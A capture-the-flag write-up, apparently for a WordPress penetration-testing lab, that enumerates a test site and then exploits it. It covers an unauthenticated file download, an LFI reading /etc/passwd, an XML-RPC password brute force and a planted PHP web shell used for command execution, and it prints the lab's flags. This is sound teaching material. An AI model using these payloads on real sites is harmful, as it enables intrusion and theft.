## Challenge 1

Identify the WordPress version number.

## Solution 1

First all the scans don't work, as it seems it is not running WordPress.

After some navigation to the website, I click on `Blog` and the site with the url `http://blog.inlanefreight.local/` doesn't open.

I added that with the ip on the `/etc/hosts` file, and then it works.

Now, let's try to enumerate the version.

```sh
curl -s -X GET http://blog.inlanefreight.local/ | grep '<meta name="generator"'
<meta name="generator" content="WordPress 5.1.6" />
```

## Challenge 2

Identify the WordPress theme in use.

## Solution 2

```sh
curl -s -X GET http://blog.inlanefreight.local | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
http://blog.inlanefreight.local/wp-content/themes/twentynineteen/print.css?ver=1.3
<body class="home blog wp-custom-logo wp-embed-responsive tribe-no-js page-template-var-www-blog-inlanefreight-local-public_html-wp-content-themes-twentynineteen-page-php hfeed image-filters-enabled">
```

So the answer is `twentynineteen`.

## Challenge 3

Submit the contents of the flag file in the directory with directory listing enabled.

## Solution 3

Let's enumerate to check if the directory listing is enabled, and try to access that.

By running the following command:

```sh
curl -s -X GET http://blog.inlanefreight.local | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

There I saw that there is a directory `/uploads` and after opening it, there is a file `upload_flag.txt` which contains the flag `HTB{d1sabl3_d1r3ct0ry_l1st1ng!}`.

## Challenge 4

Identify the only non-admin WordPress user. `(Format: <first-name> <last-name>)`

## Solution 4

Let's use WPScan to enumerate users.

```sh
wpscan --url http://blog.inlanefreight.local --enumerate u
```

This gives three users:
- erika
- admin
- Charlie Wiggins

The last one is the answer to the challenge.

## Challenge 5

Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.

## Solution 5

Let's scan the site with the api token in order to get vulnerable plugins.

```sh
wpscan --url http://blog.inlanefreight.local --enumerate --api-token <token>
```

This provided with a number of vulnerable plugins.

The CVE-2019-19985 on **exploitdb** is `Unauthorized File Download` and the PoC is `curl [BASE_URL]'/wp-admin/admin.php?page=download_report&report=users&status=all'`.

So after using this on the site, we got the flag:

```sh
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
```


## Challenge 6

What is the version number of the plugin vulnerable to an LFI?

## Solution 6

One of the vulnerable plugins has a LFI, which we can use to read documents.

```sh
[!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt

```

So the answer to this is `1.1.1`.

## Challenge 7

Use the LFI to identify a system user whose name starts with the letter "f".

## Solution 7

A PoC to this LFI vulnerability found in **exploitdb** is:

```sh
/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

And if we go to `http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd` we see that we can read the file.

And one of the users is `frank.mclane`.

## Challenge 8

Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.

## Solution 8

From the WPScan we see that `xmlrpc` is enabled and we perform a password attack using the `rockyou.txt` wordlist, on the user `erika`.

```sh
wpscan --password-attack xmlrpc -t 20 -U erika -P rockyou.txt --url http://blog.inlanefreight.local
```

And the password of `erika` is `010203`.

```sh
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - erika / 010203                                                                                                                                                            
Trying erika / gatito Time: 00:00:19 <                                                                                                        > (700 / 14345091)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: erika, Password: 010203
```

Login with these credentials to `/wp-admin`.

On `Apperance` - `Theme editor` and on theme `Twenty Sixteen` which is not active, edit the file `404.php` file and add a web shell.

```php
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */
system($_GET['cmd']); ?>

<?php get_sidebar(); ?>
<?php get_footer(); ?>

```

When we go then to:

```sh
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php?cmd=id"
```

I see the output, which confirms our RCE:

```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then we list the files on `/home/erika`.

```sh
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php?cmd=ls%20/home/erika"
d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
```

And in the end open the file, to obtain the final flag.

```sh
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentysixteen/404.php?cmd=cat%20/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
HTB{w0rdPr355_4SS3ssm3n7}
```
